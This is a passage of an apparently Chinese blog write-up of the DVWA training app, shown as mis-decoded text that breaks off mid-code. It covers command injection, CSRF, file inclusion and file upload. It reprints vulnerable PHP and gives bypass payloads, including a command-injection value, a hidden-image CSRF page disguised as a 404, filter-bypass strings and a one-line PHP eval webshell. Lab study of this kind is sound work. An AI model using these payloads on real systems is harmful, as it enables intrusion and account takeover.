<p>åˆç»§ç»­åœ¨é»‘åå•ä¸­å¢åŠ äº†æ›´å¤šçš„é™åˆ¶</p>
<p>ä»”ç»†è§‚å¯Ÿå<strong>127.0.0.1 |ipconfig</strong>å¯ä»¥ç»•è¿‡</p>
<h3 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// æ£€æŸ¥è¡¨å•æäº¤</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Submit&#x27;</span>])) &#123;<br>    <span class="hljs-comment">// æ£€æŸ¥ Anti-CSRF ä»¤ç‰Œ(èº«ä»½éªŒè¯)</span><br>    <span class="hljs-title function_ invoke__">checkToken</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;user_token&#x27;</span>], <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;session_token&#x27;</span>], <span class="hljs-string">&#x27;index.php&#x27;</span>);<br><br>    <span class="hljs-comment">// è·å–ç”¨æˆ·è¾“å…¥</span><br>    <span class="hljs-variable">$target</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br>    <span class="hljs-variable">$target</span> = <span class="hljs-title function_ invoke__">stripslashes</span>(<span class="hljs-variable">$target</span>);<br><br>    <span class="hljs-comment">// å°† IP æ‹†åˆ†ä¸º 4 ä¸ªå…«ä½</span><br>    <span class="hljs-variable">$octet</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-variable">$target</span>);<br><br>    <span class="hljs-comment">// æ£€æŸ¥æ¯ä¸ªå…«ä½æ˜¯å¦ä¸ºæ•´æ•°</span><br>    <span class="hljs-keyword">if</span> (<br>        (<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$octet</span>[<span class="hljs-number">0</span>])) &amp;&amp;<br>        (<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$octet</span>[<span class="hljs-number">1</span>])) &amp;&amp;<br>        (<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$octet</span>[<span class="hljs-number">2</span>])) &amp;&amp;<br>        (<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$octet</span>[<span class="hljs-number">3</span>])) &amp;&amp;<br>        (<span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$octet</span>) == <span class="hljs-number">4</span>)<br>    ) &#123;<br>        <span class="hljs-comment">// å¦‚æœæ‰€æœ‰ 4 ä¸ªå…«ä½éƒ½æ˜¯æ•´æ•°ï¼Œåˆ™é‡æ–°ç»„åˆ IP</span><br>        <span class="hljs-variable">$target</span> = <span class="hljs-variable">$octet</span>[<span class="hljs-number">0</span>] . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$octet</span>[<span class="hljs-number">1</span>] . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$octet</span>[<span class="hljs-number">2</span>] . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$octet</span>[<span class="hljs-number">3</span>];<br><br>        <span class="hljs-comment">// åˆ¤æ–­æ“ä½œç³»ç»Ÿå¹¶æ‰§è¡Œ ping å‘½ä»¤</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-title function_ invoke__">php_uname</span>(<span class="hljs-string">&#x27;s&#x27;</span>), <span class="hljs-string">&#x27;Windows NT&#x27;</span>)) &#123;<br>            <span class="hljs-comment">// Windows</span><br>            <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&#x27;ping  &#x27;</span> . <span class="hljs-variable">$target</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// *nix</span><br>            <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&#x27;ping  -c 4 &#x27;</span> . <span class="hljs-variable">$target</span>);<br>        &#125;<br><br>        <span class="hljs-comment">// è¿”å›ç»™ç”¨æˆ·çš„åé¦ˆ</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// æç¤ºç”¨æˆ·è¾“å…¥çš„ IP æ— æ•ˆ</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// ç”Ÿæˆ Anti-CSRF ä»¤ç‰Œ</span><br><span class="hljs-title function_ invoke__">generateSessionToken</span>();<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>è¿™ç§å°±ç±»ä¼¼äºç™½åå•ï¼Œæ¯”é»‘åå•æ›´æœ‰å±€é™æ€§ï¼Œä»¥æˆ‘ç°åœ¨çš„å®åŠ›ç»•è¿‡ä»éœ€è¦åŠªåŠ›</p>
<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼šæ”»å‡»è€…åˆ©ç”¨Â·å—å®³è€…æœªå¤±æ•ˆçš„èº«ä»½ä¿¡æ¯ï¼Œè¯±éª—å—å®³è€…ç‚¹å‡»æ¶æ„é“¾æ¥æˆ–è€…å«æœ‰æ”»å‡»ä»£ç çš„é¡µé¢ï¼Œåœ¨å—å®³è€…ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹ç”¨å—å®³è€…èº«ä»½å‘æœåŠ¡å™¨å‘èµ·è¯·æ±‚</p>
<h3 id="low-2"><a href="#low-2" class="headerlink" title="low"></a>low</h3><p><img src="/2024/01/19/DVWA%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/image-20240127113836536.png" srcset="/img/loading.gif" lazyload alt="image-20240127113836536"></p>
<p><a target="_blank" rel="noopener" href="http://t.nxw.so/cIMrJ">http://t.nxw.so/cIMrJ</a> ç”¨è¿™ä¸ªé“¾æ¥æ‰“å¼€å¯†ç æˆåŠŸè¢«ä¿®æ”¹æˆæ”¹åŸé“¾æ¥çš„å¯†ç </p>
<p>åŒæ—¶æˆ‘ä»¬ä¹Ÿå¯ä»¥å†™ä¸€ä¸ªé”™è¯¯é¡µé¢ï¼Œå¯¼è‡´ç”¨æˆ·ç‚¹å‡»ä¹‹åä»¥ä¸ºå‡ºé”™ï¼Œå®é™…ä¸Šå·²ç»æ‰§è¡Œäº†æ¶æ„ä»£ç </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://t.nxw.so/cIMrJ&quot;</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display:none;&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span><br>    404<br><span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span><br>    file not found.<br><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br></code></pre></td></tr></table></figure>

<h3 id="medium-1"><a href="#medium-1" class="headerlink" title="medium"></a>medium</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;Change&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Checks to see where the request came from</span><br><span class="hljs-comment">//stripos(str1, str2)æ£€æŸ¥str2åœ¨str1ä¸­å‡ºç°çš„ä½ç½®ï¼ˆä¸åŒºåˆ†å¤§å°å†™)ï¼Œå¦‚æœæœ‰è¿”//å›Trueï¼Œåä¹‹False</span><br><span class="hljs-comment">//åˆ¤æ–­Hostå­—æ®µæ˜¯å¦å‡ºç°åœ¨refererå­—æ®µä¸­</span><br>    <span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">stripos</span>( <span class="hljs-variable">$_SERVER</span>[ <span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span> ] ,<span class="hljs-variable">$_SERVER</span>[ <span class="hljs-string">&#x27;SERVER_NAME&#x27;</span> ]) !== <span class="hljs-literal">false</span> ) &#123;<br>        <span class="hljs-comment">// Get input</span><br><br>        <span class="hljs-variable">$pass_new</span>  = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password_new&#x27;</span> ];<br>        <span class="hljs-variable">$pass_conf</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password_conf&#x27;</span> ];<br><br>        <span class="hljs-comment">// Do the passwords match?</span><br>        <span class="hljs-keyword">if</span>( <span class="hljs-variable">$pass_new</span> == <span class="hljs-variable">$pass_conf</span> ) &#123;<br>            <span class="hljs-comment">// They do!</span><br>            <span class="hljs-variable">$pass_new</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$pass_new</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>            <span class="hljs-variable">$pass_new</span> = <span class="hljs-title function_ invoke__">md5</span>( <span class="hljs-variable">$pass_new</span> );<br><br>            <span class="hljs-comment">// Update the database</span><br>            <span class="hljs-variable">$insert</span> = <span class="hljs-string">&quot;UPDATE `users` SET password = &#x27;<span class="hljs-subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . <span class="hljs-title function_ invoke__">dvwaCurrentUser</span>() . <span class="hljs-string">&quot;&#x27;;&quot;</span>;<br>            <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$insert</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>            <span class="hljs-comment">// Feedback for the user</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// Issue with passwords matching</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Didn&#x27;t come from a trusted source</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;That request didn&#x27;t look correct.&lt;/pre&gt;&quot;</span>;<br>    &#125;<br><br>    ((<span class="hljs-title function_ invoke__">is_null</span>(<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>æ£€æŸ¥äº†Referer ä¸­æ˜¯å¦åŒ…å«äº† Host çš„å€¼ï¼Œå¸Œæœ›é€šè¿‡è¿™ç§æœºåˆ¶æŠµå¾¡CSRFæ”»å‡»</p>
<p>æƒ³è¦æ¶æ„ç½‘ç«™æ‰€å‘é€çš„æµé‡åŒ…ï¼Œåªéœ€å¦‚ä¸‹</p>
<p><code>Host: 127.0.0.3</code> </p>
<p><code>Referer: http://127.0.0.1/127.0.0.3.html</code></p>
<p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒReferer ä¸­åŒ…å«äº† Host çš„å€¼</p>
<p>å°±èƒ½ç»•è¿‡äº†</p>
<p>æŠ“åŒ…</p>
<p><img src="/2024/01/19/DVWA%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/image-20240127152301968.png" srcset="/img/loading.gif" lazyload alt="image-20240127152301968"></p>
<h3 id="high-2"><a href="#high-2" class="headerlink" title="high"></a>high</h3><h2 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h2><p>å½“æœåŠ¡å™¨å¼€å¯äº†allow_url_includeé€‰é¡¹æ—¶ï¼Œé€šè¿‡ä¸€äº›PHPçš„ç‰¹æ€§å‡½æ•°ï¼ˆæ¯”å¦‚ï¼šinclude()ï¼Œrequire()ï¼Œinclude_once()å’Œrequire_once()ï¼‰åˆ©ç”¨URLå»åŠ¨æ€åŒ…å«æ–‡ä»¶ï¼Œæ­¤æ—¶å¦‚æœæ²¡æœ‰å¯¹æ–‡ä»¶æ¥æºè¿›è¡Œä¸¥æ ¼å®¡æŸ¥ï¼Œå°±ä¼šå¯¼è‡´ä»»æ„æ–‡ä»¶è¯»å–æˆ–è€…ä»»æ„å‘½ä»¤æ‰§è¡Œã€‚</p>
<p>åˆ†ç±»ï¼šæœ¬åœ°å’Œè¿œç¨‹</p>
<p>ç‰¹æ€§å‡½æ•°åŒºåˆ«</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>()   å½“ä½¿ç”¨è¯¥å‡½æ•°åŒ…å«æ–‡ä»¶æ—¶ï¼Œåªæœ‰ä»£ç æ‰§è¡Œåˆ°<span class="hljs-keyword">include</span>()å‡½æ•°æ—¶æ‰å°†æ–‡ä»¶åŒ…å«è¿›æ¥ï¼Œå‘ç”Ÿé”™è¯¯æ—¶åªç»™å‡ºä¸€ä¸ªè­¦å‘Šï¼Œç»§ç»­å‘ä¸‹æ‰§è¡Œ<br><span class="hljs-keyword">include_once</span>()   åŠŸèƒ½å’Œ<span class="hljs-keyword">include</span>()ç›¸åŒï¼ŒåŒºåˆ«åœ¨äºå½“é‡å¤è°ƒç”¨åŒä¸€æ–‡ä»¶æ—¶ï¼Œç¨‹åºåªè°ƒç”¨ä¸€æ¬¡<br><span class="hljs-keyword">require</span>()   <span class="hljs-keyword">require</span>()ä¸<span class="hljs-keyword">include</span>()çš„åŒºåˆ«åœ¨äº<span class="hljs-keyword">require</span>()æ‰§è¡Œå¦‚æœå‘ç”Ÿé”™è¯¯ï¼Œå‡½æ•°ä¼šè¾“å‡ºé”™è¯¯ä¿¡æ¯ï¼Œå¹¶ç»ˆæ­¢è„šæœ¬çš„è¿è¡Œ ã€‚ä½¿ç”¨<span class="hljs-keyword">require</span>()å‡½æ•°åŒ…å«æ–‡ä»¶æ—¶ï¼Œåªè¦ç¨‹åºä¸€æ‰§è¡Œï¼Œç«‹å³è°ƒç”¨æ–‡ä»¶ï¼Œè€Œ<span class="hljs-keyword">include</span>()åªæœ‰ç¨‹åºæ‰§è¡Œåˆ°å‡½æ•°æ—¶æ‰è°ƒç”¨ .<span class="hljs-keyword">require</span>()åœ¨phpç¨‹åºæ‰§è¡Œå‰æ‰§è¡Œï¼Œä¼šå…ˆè¯»å…¥ <span class="hljs-keyword">require</span> æ‰€æŒ‡å®šå¼•å…¥çš„æ–‡ä»¶ï¼Œä½¿å®ƒå˜æˆ PHP ç¨‹åºç½‘é¡µçš„ä¸€éƒ¨ä»½ã€‚<br><span class="hljs-keyword">require_once</span>()   å®ƒçš„åŠŸèƒ½ä¸<span class="hljs-keyword">require</span>()ç›¸åŒï¼ŒåŒºåˆ«åœ¨äºå½“é‡å¤è°ƒç”¨åŒä¸€æ–‡ä»¶æ—¶ï¼Œç¨‹åºåªè°ƒç”¨ä¸€æ¬¡<br></code></pre></td></tr></table></figure>

<h3 id="low-3"><a href="#low-3" class="headerlink" title="low"></a>low</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// The page we wish to display</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;page&#x27;</span> ];<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>

<p>æ²¡æœ‰ä»»ä½•é˜²æŠ¤ï¼Œé€šè¿‡getè·å–æ–‡ä»¶å†…å®¹ã€‚è§¦å‘ä¸¤ç§åŒ…å«</p>
<p>æœ¬åœ°åŒ…å«</p>
<p><img src="/2024/01/19/DVWA%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/image-20240127160327688.png" srcset="/img/loading.gif" lazyload alt="image-20240127160327688"></p>
<p>è¿œç¨‹åŒ…å«</p>
<p><img src="/2024/01/19/DVWA%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/image-20240127160433421.png" srcset="/img/loading.gif" lazyload alt="image-20240127160433421"></p>
<h3 id="medium-2"><a href="#medium-2" class="headerlink" title="medium"></a>medium</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// The page we wish to display</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;page&#x27;</span> ];<br><br><span class="hljs-comment">// Input validation</span><br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>( <span class="hljs-keyword">array</span>( <span class="hljs-string">&quot;http://&quot;</span>, <span class="hljs-string">&quot;https://&quot;</span> ), <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file</span> );<br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>( <span class="hljs-keyword">array</span>( <span class="hljs-string">&quot;../&quot;</span>, <span class="hljs-string">&quot;..\&quot;&quot;</span> ), <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file</span> );<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>

<p>åŠ äº†ä¸€äº›è¿‡æ»¤ï¼Œå°†â€œhttp:&#x2F;&#x2F;â€ï¼Œâ€œhttps:&#x2F;&#x2F;â€ï¼Œâ€œ..&#x2F;â€ï¼Œâ€œ..\â€å…¨éƒ¨æ›¿æ¢æˆäº†ç©ºï¼Œè¿™ä¸ªåœ°æ–¹å…¶å®å¯ä»¥è€ƒè™‘åŒå†™ç»•è¿‡ã€‚</p>
<blockquote>
<p>ht<a target="_blank" rel="noopener" href="http://tp//www.baidu.com">http://tp://www.baidu.com</a></p>
</blockquote>
<blockquote>
<p>â€¦&#x2F;.&#x2F;</p>
</blockquote>
<h3 id="high-3"><a href="#high-3" class="headerlink" title="high"></a>high</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// The page we wish to display</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;page&#x27;</span> ];<br><br><span class="hljs-comment">// Input validation</span><br><span class="hljs-comment">//æ–‡ä»¶åå¿…é¡»ä»¥fileå¼€å§‹ï¼Œæˆ–åªèƒ½ä¸ºinclude.php</span><br><span class="hljs-keyword">if</span>( !<span class="hljs-title function_ invoke__">fnmatch</span>( <span class="hljs-string">&quot;file*&quot;</span>, <span class="hljs-variable">$file</span> ) &amp;&amp; <span class="hljs-variable">$file</span> != <span class="hljs-string">&quot;include.php&quot;</span> ) &#123;<br>    <span class="hljs-comment">// This isn&#x27;t the page we want!</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ERROR: File not found!&quot;</span>;<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>ä½¿ç”¨ä¼ªåè®®ï¼šfile:&#x2F;&#x2F; </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">file://		è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ<br>http://		è®¿é—® HTTPs ç½‘å€<br>ftp://		è®¿é—® ftp URL <br>Php://		è®¿é—®è¾“å…¥è¾“å‡ºæµ<br>Zlib://		å‹ç¼©æµ<br>Data://		æ•°æ®<br>Ssh2://		security shell2 <br>Expect://		å¤„ç†äº¤äº’å¼çš„æµ<br>Glob://		æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„<br></code></pre></td></tr></table></figure>



<h2 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h2><p>ç”±äºå¯¹ä¸Šä¼ æ–‡ä»¶çš„å†…ã€ç±»å‹æ²¡æœ‰åšä¸¥æ ¼çš„è¿‡æ»¤ã€æ£€æŸ¥ï¼Œä½¿å¾—æ”»å‡»è€…å¯ä»¥å°†ç—…æ¯’ï¼Œæœ¨é©¬ï¼Œwebshellï¼Œå…¶ä»–æ¶æ„è„šæœ¬æˆ–è€…æ˜¯åŒ…å«äº†è„šæœ¬çš„å›¾ç‰‡ä¸Šä¼ åˆ°æœåŠ¡å™¨ã€‚</p>
<p>ä¸€å¥è¯æœ¨é©¬</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>    <span class="hljs-title function_ invoke__">phpinfo</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>



<h3 id="medium-3"><a href="#medium-3" class="headerlink" title="medium"></a>medium</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Upload&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Where are we going to be writing to?</span><br>    <span class="hljs-variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="hljs-string">&quot;hackable/uploads/&quot;</span>;<br>    <span class="hljs-variable">$target_path</span> .= <span class="hljs-title function_ invoke__">basename</span>( <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;name&#x27;</span> ] );<br><br>    <span class="hljs-comment">// File information</span><br>    <span class="hljs-variable">$uploaded_name</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;name&#x27;</span> ];<br>    <span class="hljs-variable">$uploaded_type</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;type&#x27;</span> ];<br>    <span class="hljs-variable">$uploaded_size</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;size&#x27;</span> ];<br><br>    <span class="hljs-comment">// Is it an image?</span><br><span class="hljs-comment">//æ–‡ä»¶ç±»å‹å¿…é¡»æ˜¯image/jpeg æˆ–è€… image/pngï¼Œå¤§å°ä¸èƒ½è¶…è¿‡100000Bï¼ˆçº¦ä¸º97.6KBï¼‰</span><br>    <span class="hljs-keyword">if</span>( ( <span class="hljs-variable">$uploaded_type</span> == <span class="hljs-string">&quot;image/jpeg&quot;</span> || <span class="hljs-variable">$uploaded_type</span> == <span class="hljs-string">&quot;image/png&quot;</span> ) &amp;&amp;<br>        ( <span class="hljs-variable">$uploaded_size</span> &lt; <span class="hljs-number">100000</span> ) ) &#123;<br><br>        <span class="hljs-comment">// Can we move the file to the upload folder?</span><br>        <span 